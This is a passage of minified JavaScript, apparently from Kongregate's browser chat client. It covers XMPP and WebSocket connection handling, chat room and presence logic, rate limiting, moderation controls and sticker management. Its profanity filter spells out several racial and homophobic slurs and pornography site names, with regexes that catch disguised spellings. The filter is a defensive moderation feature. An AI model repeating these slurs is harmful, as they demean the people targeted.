WebSocket endpoint: "+e.wsEndpoint));var t=e.wsEndpoint.match(/:\/\/([^:]+):?(\d*)$/),i=t[1];(t=t[2])&&"80"!==t&&"443"!==t&&(t=parseInt(t,10)+1,Kongregate.Log.debug("Loading Flash policy file from non-standard port: "+t),WebSocket.loadFlashPolicyFile("xmlsocket://"+i+":"+t)),e.boshEndpoint=null}},_requestJoinGameRoom:function(){this.sendKongregateMessage(JabberConnection.OP_REQUEST_GAME_ROOM,{game_id:this._activeUser.gameId(),permalink:this._activeUser.gamePermalink(),game_name:this._activeUser.gameName()})},_validateGameRoom:function(e){if(!e.xmpp_name||0===e.xmpp_name.length)return Kongregate.Log.info("Game room join request received with no roomID, requesting one from server"),this._requestJoinGameRoom(),!1;if(0!==e.xmpp_name.indexOf(this._activeUser.gameId()+"-"+this._activeUser.gamePermalink()+"-")){if("en"===e.language)return Kongregate.Log.warn("Invalid English game room: "+e.xmpp_name),!1;if(isNaN(parseInt(e.xmpp_name,10)))return Kongregate.Log.warn("Invalid non-English game room: "+e.xmpp_name),!1}return!0},_validatePrivateRoom:function(e){return 0===(e=e.xmpp_name).indexOf(JabberConnection.PRIVATE_ROOM_PREFIX)||(Kongregate.Log.warn("Invalid private room name: "+e),!1)},_buildKongregateIQ:function(e,t){return t=Base64.encode(JSON.stringify(t||{})),$iq({type:"get",id:this._client.getUniqueId()}).c("query",{xmlns:JabberConnection.KONGREGATE_IQ_NAMESPACE}).c("msg",{opcode:e}).t(t).up().up()},_parseKongregateIQ:function(e){var t=Strophe.getNodeFromJid(e.getAttribute("from")),i=e.childNodes[0].childNodes[0];if(e=i.getAttribute("opcode"),i=JSON.parse(Base64.decode(i.textContent||i.text)),Kongregate.Log.debug("Kongregate Packet["+t+"] "+e+": "+JSON.stringify(i)),"admin"===t||0===t.indexOf("kong_"))return{opcode:e,params:i};throw Error("Ignoring Kongregate IQ packet from incorrect sender")},_createClient:function(){this._resetClient(),this.connectionEndpoint(),this._client=new Strophe.Connection(this.connectionEndpoint(),{contentType:"text/plain; charset=utf-8",withCredentials:!0}),this._resetClient()},_shouldSwitchConnectionType:function(){if(!this.webSocketsEnabled())return!1;var e="bosh"===this.connectionType();return 0===this._connectionAttempts?e:e?this._connectionAttempts>JabberConnection.MAX_BOSH_CONNECTION_ATTEMPTS:this._connectionAttempts>=(this._webSocketsReliable?JabberConnection.RELIABLE_WEBSOCKET_CONNECTION_ATTEMPTS:JabberConnection.UNRELIABLE_WEBSOCKET_CONNECTION_ATTEMPTS)},_switchConnectionType:function(){this._wasOffline?(Kongregate.Log.info("Was offline, will attempt to reconnect with websocket"),this._forceBosh=!1):(Kongregate.Log.info("Switching connection type due to failures, attempts="+this._connectionAttempts),this._forceBosh=!this._forceBosh),this._wasOffline=!1,this._createClient(),this._connectionAttempts=0,this._webSocketsReliable=!1},_resetClient:function(){this._client&&(this._client.reset(),this._resetRooms(),this._client.rawOutput=e(this._onOutgoingData,this,!0),this._client.rawInput=e(this._onIncomingData,this,!0),this._client.addHandler(e(this._onKongregateIQ,this,!0),JabberConnection.KONGREGATE_IQ_NAMESPACE,"iq"),this._client.addHandler(e(this._onErrorStanza,this,!0),"jabber:client",null,"error"),this._client.service=this.connectionEndpoint(),this._invalidSession=this._loginFailed=this._banned=this._sessionConflict=!1)},_startConnectionMonitor:function(){this._stopConnectionMonitor(),this._connectionMonitorInterval=setInterval(this._connectionMonitor.bind(this),JabberConnection.CONNECTION_MONITOR_INTERVAL)},_stopConnectionMonitor:function(){this._connectionMonitorInterval&&(clearInterval(this._connectionMonitorInterval),this._connectionMonitorInterval=void 0)},_sendEmptyWebsocketPacket:function(){try{"websocket"===this.connectionType()&&this._client._proto.socket&&(this._client._proto.socket.send(""),this._lastWebsocketPing=(new Date).getTime())}catch(e){Kongregate.Log.error("Error while sending empty websocket packet",e)}},_connectionMonitor:function(){if(this.connected()){var e=(new Date).getTime(),t=e-this._lastOutgoingPacket,i=e-this._lastIncomingPacket,n=e-this._connectionTime;e-=this._lastWebsocketPing,0>t||t>=JabberConnection.PING_INTERVAL?this._client.ping.ping():e>=JabberConnection.WEBSOCKET_PING_INTERVAL&&this._sendEmptyWebsocketPacket(),i>=JabberConnection.IDLE_INCOMING_TIMEOUT?(this._numTimeouts+=1,this.disconnect("timeout")):!this._webSocketsReliable&&"websocket"===this.connectionType()&&n>=JabberConnection.IDLE_INCOMING_TIMEOUT&&(Kongregate.Log.debug("Marking WebSocket connections as reliable"),this._webSocketsReliable=!0)}},_scheduleReconnect:function(){this._reconnectTimeout=setTimeout(this.connect.bind(this),this._reconnectTime)},_createRoom:function(e){return new JabberChatRoom({connection:this,activeUser:this._activeUser,xmppName:e.xmpp_name,gameId:e.game_id,name:e.name,type:e.type})},_resetRooms:function(){var e=this._client.muc;e.rooms={},e.roomNames=[],e._muc_handler=null,$j.each(this._rooms,(function(e,t){t.leave(!0)}))},_joinRooms:function(){$j.each(this._rooms,(function(e,t){t.join()}))},setPresence:function(e,t){if(this._presence[t]!=e){if(null===t){var i=(new Date).getTime();if(this._lastSetPresence&&i-this._lastSetPresence<JabberConnection.SET_PRESENCE_INTERVAL)return;this._lastSetPresence=i,$j.each(this._rooms,function(t,i){this._presence[i]=e}.bind(this))}this._presence[t]=e,Kongregate.Log.info("Changing user presence to "+e),this.sendKongregateMessage(JabberConnection.OP_SET_PRESENCE,{from:this._activeUser.chatUsername(),presence:e,room_name:t})}},_isBlankBoshStanza:function(e){return/^<body/.test(e)&&!/<\/body>$/.test(e)},_onIncomingData:function(e){Kongregate.Log.spam(" IN: "+e),this._isBlankBoshStanza(e)||(this._stanzasReceived+=1,this._lastIncomingPacket=(new Date).getTime())},_onOutgoingData:function(e){Kongregate.Log.spam("OUT: "+e),this._isBlankBoshStanza(e)||(e=(new Date).getTime(),this._stanzasSent+=1,this._lastWebsocketPing=this._lastOutgoingPacket=e)},_onKongregateIQ:function(e){try{var t=this._parseKongregateIQ(e);this._onServerMessage(t),this.trigger(JabberConnection.KONGREGATE_MESSAGE_EVENT,t)}catch(e){Kongregate.Log.error("Error handling kongregate packet",e)}return!0},_onErrorStanza:function(e){return Kongregate.Log.error("XMPP error received",e),(e=e.textContent||e.text)&&"sticker"===e.split(":")[0]&&this.trigger(KonduitEvent.MESSAGE_ERROR,{errorType:KonduitChatErrorMessage.STICKER}),!0},_onServerMessage:function(e){var t=e.params;switch(e.opcode){case JabberConnection.OP_REQUEST_GAME_ROOM:this._onGameRoomResult(t);break;case JabberConnection.OP_PRIVATE_MESSAGE:this._onPrivateMessage(t);break;case JabberConnection.OP_STATS_SUBMIT:this._onStatSubmissionResult(t);break;case JabberConnection.OP_CREATE_PRIVATE_ROOM:this._onPrivateRoomCreated(t);break;case JabberConnection.OP_PRIVATE_ROOM_INVITE:this._onPrivateRoomInvite(t);break;case JabberConnection.OP_SILENCED:this._onSilenced(t);break;case JabberConnection.OP_PARTICIPATE:this._onParticipate(t)}},_onPrivateRoomCreated:function(e){if(e.success){var t=e["room.name"];e=e["room.natural"],Kongregate.Log.info("Private room created: "+t+", name="+e),this.joinRoom({type:"private",id:t,xmpp_name:t,name:e})}else Kongregate.Log.info("Private room creation failed")},_onPrivateRoomInvite:function(e){var t=e["room.name"],i=e["room.natural"],n=e.from;n.toLowerCase()===this.myNode()?(t=e.success,i=e.error,Kongregate.Log.info("Private room invitation sent, sucess="+t+", error="+i),this.trigger(KonduitEvent.PRIVATE_ROOM_INVITATION_SENT,{username:e.to,success:t,error:i})):(Kongregate.Log.info("Private room invitation (from "+n+"): "+t+", name="+i),this.trigger(KonduitEvent.PRIVATE_ROOM_INVITATION,{username:n,xmpp_name:t,name:i,type:"private"}))},_onGameRoomResult:function(e){Kongregate.Log.debug("Game room result",e),this.joinRoom({type:"game",id:e["room.name"],xmpp_name:e["room.name"],name:e["room.natural"],game_id:this._activeUser.gameId()})},_onSilenced:function(e){this.trigger(KonduitEvent.SILENCED,e)},_onParticipate:function(e){this.trigger(KonduitEvent.PARTICIPATE,e)},_onConnectionStatus:function(e,t){switch(Kongregate.Log.debug("Connection status changed, status="+e+", err="+t),e){case Strophe.Status.ERROR:this._onError(t);break;case Strophe.Status.CONNECTING:this.trigger(KonduitEvent.CONNECT);break;case Strophe.Status.CONNECTED:this._onConnected();break;case Strophe.Status.DISCONNECTED:this._onDisconnected(t);break;case Strophe.Status.AUTHFAIL:this._onAuthFailure();break;default:Kongregate.Log.debug("Unknown status: "+e)}},_onConnected:function(){clearTimeout(this._reconnectTimeout);var e=this.connectionType();"websocket"===e&&(Kongregate.Log.info("Marking websocket connection successful"),this._webSocketsSuccessful=!0);var t=(new Date).getTime();this._numConnections[e]+=1,this._reconnectTime=void 0,this._connectionTime=this._lastWebsocketPing=this._lastIncomingPacket=this._lastOutgoingPacket=t,this._shutdown=!1,this._connectionAttempts=0,this._startConnectionMonitor(),this._setRosterPresence("chat"),this.trigger(KonduitEvent.LOGIN),this._joinRooms()},_onDisconnected:function(){if(this._stopConnectionMonitor(),this._resetRooms(),navigator.onLine||(this._wasOffline=!0,Kongregate.Log.info("Network unavailable, setting offline flag")),this.trigger(KonduitEvent.DISCONNECT,{conflict:this._sessionConflict,login_failed:this._loginFailed,banned:this._banned}),!(this._sessionConflict||this._banned||this._loginFailed)){var e=Math.random()*JabberConnection.RECONNECT_INTERVAL/2+JabberConnection.RECONNECT_INTERVAL/2,t=JabberConnection.MAX_RECONNECT_INTERVAL;this._reconnectTime=this._reconnectTime?Math.min(t,1.5*this._reconnectTime):e,Kongregate.Log.warn("Disconnected, reconnecting in: "+this._reconnectTime),this._scheduleReconnect()}},_onError:function(e){Kongregate.Log.warn("Connection error",e),"conflict"===e?(Kongregate.Log.debug("Session conflict detected"),this._sessionConflict=!0):"policy-violation"===e?(Kongregate.Log.debug("Ban detected"),this._banned=!0):"system-shutdown"===e||"remote-stream-error"===e?(Kongregate.Log.debug("System shutdown detected"),this._shutdown=!0):"item-not-found"===error&&(this._invalidSession=!0,Kongregate.Log.debug("Invalid session detected"))},_onAuthFailure:function(){Kongregate.Log.debug("Login failure detected"),this._loginFailed=!0,this._onDisconnected()},_onPrivateMessage:function(e){var t=e.from,i=e.to,n=e.success;e=e.data,!0===n&&0===t.toLowerCase().indexOf("guest")||this.trigger(KonduitEvent.PRIVATE_MESSAGE,{success:n,from:t,to:i,message:e})},_onStatSubmissionResult:function(e){e.result=!0,this.trigger(KonduitEvent.STATISTICS_FLUSH,e)},_setRosterPresence:function(e){this._client.send($pres().c("show").t(e))},_validate:function(){return!(!this._activeUser.isAuthenticated()||this._checkRateLimitViolation())},_filterMessage:function(e){return this._messageFilter.filterMessage(e)},_checkRateLimitViolation:function(){var e=this._rateLimiter.ruleViolated();return!!e&&(this.trigger(KonduitEvent.MESSAGE_ERROR,{errorType:KonduitChatErrorMessage.RATE_LIMITED,ruleViolated:e}),!0)},_onFilterError:function(e){this.trigger(KonduitEvent.MESSAGE_ERROR,{errorType:e.errorType})}},$j.extend(JabberConnection.prototype,Evented)}(),JabberRateLimiter.prototype={ruleViolated:function(){var e=(new Date).getTime(),t=!1,i=this;return this._timestamps=this._timestamps.filter((function(t){return t>=e-6e4})),$j.each(this._rules,(function(n,s){i._timestamps.filter((function(t){return t>=e-s.duration})).length>=s.capacity&&(t=!0)})),t||this._timestamps.push(e),t}},Konduit=function(e){this.initialize(e)},Konduit.prototype={initialize:function(){this.queuedEvents=[],this.setupComplete=!1},setup:function(e){this.setupComplete||(this.flashAdapter=new KonduitFlashAdapter(e),this.fayeAdapter=new KonduitFayeAdapter(e),this.jabberAdapter=new KonduitJabberAdapter($j.extend(e,{connect:!0,traceXmpp:5<=active_user.debugLevel(),activeUser:active_user,host:e.chatHost,wsEndpoint:e.chatProxyWebsocket,boshEndpoint:e.chatProxyBosh,flashEventDispatcher:this.flashAdapter})),this.jsAdapter=new KonduitJavascriptAdapter($j.extend(e,{activeUser:active_user})),this.setupComplete=!0,this.flushEventQueue())},dispatchEvent:function(e){this.setupComplete?this.fayeAdapter.dispatchEvent(e)||this.jabberAdapter&&this.jabberAdapter.dispatchEvent(e)||this.jsAdapter&&this.jsAdapter.dispatchEvent(e)||this.flashAdapter.dispatchEvent(e):(Kongregate.Log.debug("Queueing konduit event",e),this.queuedEvents.push(e))},flushEventQueue:function(){var e=this;this.queuedEvents.forEach((function(t){e.dispatchEvent(t)})),this.queuedEvents=[]},alertLog:function(){return this.flashAdapter&&this.flashAdapter.alertLog()},jabberConnected:function(){return this.jabberAdapter&&this.jabberAdapter.connected()}},KonduitFayeAdapter=function(e){this.initialize(e)},KonduitFayeAdapter.prototype={initialize:function(e){this._fayeEventDispatcher=new FayeEventDispatcher({holodeckEventDispatcher:e.eventDispatcher}),this._authenticator=e.authenticator||new GuildChatAuthenticator,this._fayeService=new FayeService({authenticator:this._authenticator,fayeConnection:e.fayeConnection}),this._fayeRoomListService=e.fayeRoomListService||new FayeRoomListService({authenticator:this._authenticator}),this._fayeHistoryService=e.fayeHistoryService||new FayeHistoryService({authenticator:this._authenticator}),this._registerEvents()},_registerEvents:function(){this._fayeService.on("joinRoom",this._fayeEventDispatcher,"joinRoom"),this._fayeService.on("joinRoom",this._fayeRoomListService,"subscribe"),this._fayeService.on("roomNotFound",this._fayeEventDispatcher,"roomNotFound"),this._fayeService.on("messageRateLimited",this._fayeEventDispatcher,"messageRateLimited"),this._fayeService.on("messageTooLong",this._fayeEventDispatcher,"messageTooLong"),this._fayeService.on("message",this._fayeEventDispatcher,"message"),this._fayeService.on("message",this._fayeRoomListService,"message"),this._fayeService.on("disconnect",this._fayeEventDispatcher,"disconnect"),this._fayeService.on("connect",this._fayeEventDispatcher,"connect"),this._fayeService.on("connect",this._fayeRoomListService,"connect"),this._fayeService.on("leaveRoom",this._fayeEventDispatcher,"leaveRoom"),this._fayeService.on("leaveRoom",this._fayeRoomListService,"unsubscribe"),this._fayeRoomListService.on("userJoin",this._fayeEventDispatcher,"userJoin"),this._fayeRoomListService.on("userChanged",this._fayeEventDispatcher,"userChanged"),this._fayeRoomListService.on("userDeparture",this._fayeEventDispatcher,"userDeparture"),this._fayeHistoryService.on("message",this._fayeEventDispatcher,"message"),this._fayeHistoryService.on("history",this._fayeEventDispatcher,"history"),this._authenticator.on("kick",this._fayeService,"leaveCurrentGuildRoom",!0)},dispatchEvent:function(e){switch(e.type){case KonduitEvent.SET_PRESENCE:return this._handleSetPresence(e.data);case KonduitEvent.JOIN_GUILD_ROOM:return this._handleJoinGuildRoom(e.data);case KonduitEvent.ROOM_MESSAGE:return this._handleRoomMessage(e.data);case KonduitEvent.LEAVE_ROOM:return this._handleLeaveRoom(e.data);case KonduitEvent.FETCH_HISTORY:return this._fetchHistory(e.data)}return!1},_handleSetPresence:function(e){return!!this._fayeService.isCurrentRoomName(e.room_name)&&(this._fayeService.setPresence(e.room_name,"chat"===e.presence),!0)},_handleLeaveRoom:function(e){return"guild"===e.room_type&&(this._fayeService.leaveCurrentGuildRoom(!1),!0)},_handleRoomMessage:function(e){return!!this._fayeService.isCurrentRoomId(e.room.id)&&(this._fayeService.sendMessage(e.message,e.room),!0)},_handleJoinGuildRoom:function(e){return this._fayeService.subscribe(e),!0},_fetchHistory:function(e){this._fayeHistoryService.fetchHistory(e.room,e.maxTime)}},KonduitFlashAdapter=function(){this.initialize()},KonduitFlashAdapter.prototype={initialize:function(){this.swf=$j("#konduit")[0]},dispatchEvent:function(e){this.enabled()&&this.swf.dispatchJSONEvent(Object.toJSON(e))},alertLog:function(){return this.enabled()?this.swf.alertLog():[]},enabled:function(){return this.swf&&"function"==typeof this.swf.dispatchJSONEvent}},KonduitJabberAdapter=function(e){this.initialize(e)},KonduitJabberAdapter.PASS_THROUGH_EVENTS=[KonduitEvent.JOIN_ROOM,KonduitEvent.USER_JOIN,KonduitEvent.USER_CHANGED,KonduitEvent.USER_DEPARTURE,KonduitEvent.ROOM_MESSAGE,KonduitEvent.GUEST_COUNT,KonduitEvent.LEAVE_ROOM,KonduitEvent.DISCONNECT,KonduitEvent.PRIVATE_MESSAGE,KonduitEvent.MESSAGE_ERROR,KonduitEvent.STATISTICS_FLUSH,KonduitEvent.PRIVATE_ROOM_INVITATION,KonduitEvent.PRIVATE_ROOM_INVITATION_SENT,KonduitEvent.REQUEST_CHAT_ROOM,KonduitEvent.ROOM_FULL,KonduitEvent.ROOM_NOT_FOUND,KonduitEvent.SILENCED,KonduitEvent.PARTICIPATE],KonduitJabberAdapter.prototype={initialize:function(e){this._activeUser=e.activeUser,this._connection=new JabberConnection(e),this._eventDispatcher=e.eventDispatcher,this._flashEventDispatcher=e.flashEventDispatcher,this._registerEvents(),e.connect&&this._connection.connect()},connected:function(e){return this._connection.connected()},dispatchEvent:function(e){switch(e.type){case KonduitEvent.CONNECT:return this._connection.connect(),!0;case KonduitEvent.JOIN_ROOM:return this._connection.joinRoom(e.data.room),!0;case KonduitEvent.LEAVE_ROOM:return this._connection.leaveRoom(e.data.room_type),!0;case KonduitEvent.ROOM_MESSAGE:return this._connection.sendGroupMessage(e.data.room.type,e.data.message),!0;case KonduitEvent.SWITCH_USER:return this._connection.switchUser(),!1;case KonduitEvent.PRIVATE_MESSAGE:return this._connection.sendPrivateMessage(e.data.username,e.data.message),!0;case KonduitEvent.STATISTICS_FLUSH:return!e.data.result&&(this._connection.flushStatistics(e.data),!0);case KonduitEvent.SET_PRESENCE:return this._connection.setPresence(e.data.presence,e.data.room_name),!0;case KonduitEvent.PRIVATE_ROOM_INVITATION:return this._connection.inviteUserToPrivateRoom(e.data.username),!0;case KonduitEvent.PRIVATE_ROOM_KICK:return this._connection.kickUserFromPrivateRoom(e.data.username),!0;case KonduitEvent.DESTROY_PRIVATE_ROOM:return this._connection.destroyPrivateRoom(),!0;default:return!1}},_registerEvents:function(){this._connection.on(KonduitEvent.CONNECT,this._onConnect.bind(this)),this._connection.on(KonduitEvent.LOGIN,this._onAuthenticated.bind(this)),this._connection.on(KonduitEvent.ROOM_MESSAGE,this._onRoomMessage.bind(this));var e=this;$j.map(KonduitJabberAdapter.PASS_THROUGH_EVENTS,(function(t){e._connection.on(t,(function(i){e._eventDispatcher.fire({type:t,data:i})}))}))},_onConnect:function(){this._eventDispatcher.fire({type:KonduitEvent.CONNECT,data:{success:!0}})},_onAuthenticated:function(){this._eventDispatcher.fire({type:KonduitEvent.LOGIN,data:{success:!0,username:this._activeUser.username(),bosh:"bosh"===this._connection.connectionType()}})},_onRoomMessage:function(e){this._flashEventDispatcher.dispatchEvent({type:KonduitEvent.ROOM_MESSAGE,data:e})}},function(){var e="fuck;cocksuck;nigger;faggot;nigga;kike;fags;pornhub;youporn;brazzers;redtube;xhamster;xvideos;xnxx;youjizz;tube8;spankbang;chaturbate;blue waffle;lemon party;meatspin".split(";"),t=["fag"],i=/(f|f( )*;|F( )*;|\u0192( )*;|\u0493( )*)(u|u( )*;|U( )*;)(c|c( )*;|C( )*;)(k|k( )*;|K( )*;)|(c|c( )*;|C( )*;)(u|u( )*;|U( )*;)(n|n( )*;|N( )*;)(t|t( )*;|T( )*;)|(c|c( )*;|C( )*;)(o|o( )*;|O( )*;)(c|c( )*;|C( )*;)(k|k( )*;|K( )*;)(s|s( )*;|S( )*;)(u|u( )*;|U( )*;)(c|c( )*;|C( )*;)(k|k( )*;|K( )*;)|(n|n( )*;|N( )*;)(i|i( )*;|I( )*;)(g|g( )*;|G( )*;)(g|g( )*;|G( )*;)(e|e( )*;|E( )*;)(r|r( )*;|R( )*;)|(f|f( )*;|F( )*;|\u0192( )*;|\u0493( )*)(a|a( )*;|A( )*;)(g|g( )*;|G( )*;)(g|g( )*;|G( )*;)(o|o( )*;|O( )*;)(t|t( )*;|T( )*;)|\b(f|f( )*;|F( )*;|\u0192( )*;|\u0493( )*)(a|a( )*;|A( )*;)(g|g( )*;|G( )*;)\b/gi,n=function(){for(var i=[],n=0;n<e.length;n++)i.push("("+e[n].replace(/\w(?=\w)/g,"$&[\\s;]*")+")");for(n=0;n<t.length;n++)i.push("\\b("+t[n].replace(/\w(?=\w)/g,"$&[\\s;]*")+")\\b");return new RegExp(i.join("|"),"gi")}();Kongregate.LanguageFilter={filter:function(e){if("string"!=typeof e)return e;for(var t="",s=0;s<e.length;s++){var o=e.charCodeAt(s);32>o&&9!=o&&10!=o&&13!=o||(t+=e.charAt(s))}return t.replace(i,"****").replace(n,"****")}}}(),LocalMuteService=function(){function e(){var e=$.jStorage.get("KWAK-MUTINGS");return e?JSON.parse(e):{}}return{mute:function(t){var i=e();i[t]=!0,$.jStorage.set("KWAK-MUTINGS",JSON.stringify(i))},unmute:function(t){var i=e();delete i[t],$.jStorage.set("KWAK-MUTINGS",JSON.stringify(i))},isMuted:function(t){return!!e()[t]},mutings:function(){return Object.keys(e())}}}(),MessageFilter.prototype={initialize:function(e){this.maxLength=250},filterMessage:function(e){return this._truncateMessage(e)},_truncateMessage:function(e){return e.length>this.maxLength&&(e=e.substring(0,this.maxLength-1)+"…",this.trigger(KonduitEvent.MESSAGE_ERROR,{errorType:KonduitChatErrorMessage.MESSAGE_TOO_LONG})),e}},$j.extend(MessageFilter.prototype,Evented),MiniProfile=function(e){this.initialize(e)},MiniProfile.prototype={initialize:function(e){this._chat_window=e.chat_window,this._holodeck=e.holodeck;var t=this;(this._container=$("user_mini_profile_container"))&&this._container.down(".return_to_room").observe("click",(function(e){t.deactivate(),e.stop()}))},activate:function(e,t){this._chat_window.setActiveTempPane(this),this._current_username=e,this._current_room=t;var i=this._container,n=this._chat_window,s=this;$("user_mini_profile").update(""),i.down(".room_name").update(t.name()),n.hideChatWindow(),n._chat_tab_clicked=!1,i.ieHappyShow(),n.showSpinner(),new Ajax.Updater({success:"user_mini_profile"},"/accounts/"+e+".chat",{method:"get",onComplete:function(){!1===n._chat_tab_clicked&&(n.hideSpinner(),s.setupBanAndSilencingControls(e),active_user.addCapturedSelector("#add_friend"),active_user.addCapturedSelector("#mute_user"))}})},deactivate:function(){this._chat_window.clearActiveTempPane(),this._container.ieHappyHide(),this._chat_window.hideSpinner(),this._chat_window.showChatWindow()},updateManualBanReasonField:function(e){$("ban_ban_reason_id").value?$("ban_reason_block").hide():$("ban_reason_block").show()},updateManualSilencingReasonField:function(e){$("silencing_silencing_reason_id").value?$("silencing_reason_block").hide():$("silencing_reason_block").show()},setupBanAndSilencingControls:function(e){this._chat_window.isModeratableUser(e)&&(["silencings","bans"].each(Element.show),$("ban_ban_reason_id")&&($("ban_ban_reason_id").observe("click",this.updateManualBanReasonField),$("ban_ban_reason_id").observe("change",this.updateManualBanReasonField),$("ban_ban_reason_id").observe("keypress",this.updateManualBanReasonField),this.updateManualBanReasonField(null)),$("silencing_silencing_reason_id")&&($("silencing_silencing_reason_id").observe("click",this.updateManualSilencingReasonField),$("silencing_silencing_reason_id").observe("change",this.updateManualSilencingReasonField),$("silencing_silencing_reason_id").observe("keypress",this.updateManualSilencingReasonField),this.updateManualSilencingReasonField(null)))}},OnlineFriends=function(e){this.initialize(e)},OnlineFriends.prototype={initialize:function(e){this._chat_window=e;var t=this;this._container=$("friends_online_container"),this._friend_list_node=$("friends_online"),this._container&&this._container.down(".return_to_room").observe("click",(function(e){t.deactivate(),e.stop()}))},activate:function(e){var t=this._chat_window;this._container.down(".room_name").update(e),t.hideChatWindow(),this.getOnlineFriends()},getOnlineFriends:function(e){var t=this._container,i=this._chat_window,n=this._friend_list_node;n.hide(),i.showSpinner(),e=e?"?page="+e:"",i._chat_tab_clicked=!1,new Ajax.Updater({success:"friends_online"},"/accounts/"+i.username()+"/online_friends.chat"+e,{method:"get",onSuccess:function(e){!1===i._chat_tab_clicked&&(i.hideChatWindow(),i.hideSpinner(),n.show(),t.show())}})},deactivate:function(){this._container.hide(),this._chat_window.showChatWindow()}},Array.prototype.binarySearch=function(e,t,i){t||(t=function(e,t){return e==t?0:e<t?-1:1});for(var n,s,o=0,a=this.length-1;o<=a;)if(0>(s=t(this[n=Math.floor((o+a)/2)],e)))o=n+1;else{if(!(0<s))return n;a=n-1}return i?o:-1},Array.prototype.orderedInsert=function(e,t){return t=this.binarySearch(e,t,!0),this.splice(t,0,e),t},Array.prototype.orderedDelete=function(e,t){if(0<=(t=this.binarySearch(e,t)))return this.splice(t,1),t;for(t=0;t<this.length;t++)if(this[t]===e)return this.splice(t,1),t;return-1},RoomInfo=function(e){this.initialize(e)},RoomInfo.prototype={initialize:function(e){this._chat_window=e.chat_window,this._holodeck=e.holodeck;var t=this;(this._container=$("room_info_container"))&&this._container.down(".return_to_room").observe("click",(function(e){t.deactivate(),e.stop()}))},activate:function(e){this._chat_window._chat_tab_clicked=!1,this._chat_window.setActiveTempPane(this),this._current_room=e;var t=this._container,i=this._chat_window;t.down(".room_name").update(e.name()),i.hideChatWindow(),i.showSpinner(),new Ajax.Updater({success:"room_info"},"/rooms/"+e.getId()+".chat",{method:"get",onSuccess:function(e){!1===i._chat_tab_clicked&&(i.hideChatWindow(),i.hideSpinner(),t.ieHappyShow())}})},deactivate:function(){this._chat_window.clearActiveTempPane(),this._container.ieHappyHide(),this._chat_window.showChatWindow()}},SharedContentWelcomeTab=function(e){this.initialize(e)},SharedContentWelcomeTab.prototype={initialize:function(e){this._active_user=e.active_user,this._holodeck=e.holodeck,this._active_user&&this._active_user.isAuthenticated()&&this._holodeck.hasSharedContent()&&!this._active_user.seenSharedContentWelcome()&&this.update()},update:function(){var e=this._holodeck,t=this._active_user.gameResourcePath()+"/featured_shared_contents.chat";this._active_user.setSeenSharedContentWelcome(!0),new Ajax.Updater({success:"shared_content_welcome_tab_pane_content"},t,{method:"get",on200:e.showSharedContentWelcomeTab.bind(e)})}},StickerManager=function(e){this.initialize(e)},StickerManager.RECENT_STICKERS_PREFIX="kong_stickers:recent:",StickerManager.MAX_RECENT_STICKERS=15,StickerManager.prototype={initialize:function(e){this.activeUser=e.active_user||window.active_user,this.recentStickersPrefix=e.recent_stickers_prefix||StickerManager.RECENT_STICKERS_PREFIX,this.dailyActivityTrackers={},this.queuedDailyActivities=[],this.update(e)},update:function(e){this.stickers={},this.stickerPacks={},this.userStickerPacks={},this.userOwnedStickers={},this.userStickerCollections=[],this.recentStickers=[],this.parseStickers(e.stickers),this.parseStickerPacks(e.sticker_packs),this.parseUserStickerPacks(e.user_sticker_packs),this.buildStickerCollections(),this.loadRecentStickers(),this.flushDailyActivityQueue(),this.trigger("update")},trackActiveSession:function(){var e=this;setTimeout((function(){e.performDailyActivity("active_session")}),3e5)},performDailyActivity:function(e){if(e)if(this.activeUser.isAuthenticated()){var t=this.dailyActivityTrackers[e]||0;if(!(this.getTimestamp()<t)){var i=this;new Ajax.Request(this.activityUrl(),{method:"POST",parameters:{activity:e},onSuccess:function(t){i.dailyActivityTrackers[e]=i.getTimestamp()+1e3*t.responseJSON.delay}})}}else-1===this.queuedDailyActivities.indexOf(e)&&this.queuedDailyActivities.push(e)},url:function(e,t,i){return e="https://"+this.activeUser.singleCDNDomain()+"/assets/dynamic/stickers/"+e+"/"+("shiny"===t?"shiny":"normal")+".png",i&&(e+="?width="+i),e},activityUrl:function(){return"/user_sticker_activities.json"},addSticker:function(e){var t=$j.extend({},e);this.stickers[e.id]=t},addStickerPack:function(e){var t=this,i=$j.extend({},e);delete i.sticker_ids,delete i.hero_sticker_id,delete i.hero_sticker_normal_url,delete i.hero_sticker_shiny_url,i.stickers=[],i.heroSticker=this.stickers[e.hero_sticker_id],i.heroStickerNormalUrl=e.hero_sticker_normal_url,i.heroStickerShinyUrl=e.hero_sticker_shiny_url,e.sticker_ids.forEach((function(e){(e=t.stickers[e])&&i.stickers.push(e)})),this.stickerPacks[e.id]=i},addUserStickerPack:function(e){this.userStickerPacks[e.sticker_pack_id]=this.userStickerPacks[e.sticker_pack_id]||{};var t=$j.extend({},e);delete t.sticker_pack_id,t.stickerPack=this.stickerPacks[e.sticker_pack_id],t.variant=e.shiny?"shiny":"normal",t.heroStickerUrl=e.shiny?t.stickerPack.heroStickerShinyUrl:t.stickerPack.heroStickerNormalUrl;var i=this.userStickerPacks[e.sticker_pack_id][t.variant];i&&i.shiny_level>=e.shiny_level?(t.shiny_level=i.shiny_level,t.quality=i.quality):(t.shiny_level=e.shiny_level,t.quality=e.quality),this.userStickerPacks[e.sticker_pack_id][t.variant]=t;var n=this;t.stickerPack.stickers.forEach((function(e){n.userOwnedStickers[e.id]=n.userOwnedStickers[e.id]||{},n.userOwnedStickers[e.id][t.variant]=!0}))},pushNewUserStickerPack:function(e){this.parseStickers(e.stickers),this.parseStickerPacks(e.sticker_packs),this.addUserStickerPack(e.user_sticker_pack),this.userStickerCollections=[],this.buildStickerCollections(),this.trigger("update")},parseStickers:function(e){var t=this;(e||[]).forEach((function(e){t.addSticker(e)}))},parseStickerPacks:function(e){var t=this;(e||[]).forEach((function(e){t.addStickerPack(e)}))},parseUserStickerPacks:function(e){var t=this;(e||[]).forEach((function(e){t.addUserStickerPack(e)}))},buildStickerCollections:function(){for(var e in this.userStickerPacks)this.addToStickerCollections(e)},addToStickerCollections:function(e){if(Object.prototype.hasOwnProperty.call(this.userStickerPacks,e)){var t=this.userStickerPacks[e].shiny;e=this.userStickerPacks[e].normal;var i=t||e;this.userStickerCollections.push({id:i.stickerPack.id,shiny:t?t.stickerPack.stickers:[],normal:e?e.stickerPack.stickers:[],name:i.stickerPack.name,iconUrl:i.heroStickerUrl})}},isStickerOwned:function(e,t){return!!(this.userOwnedStickers[e]||{})[t]},recentStickersKey:function(){return 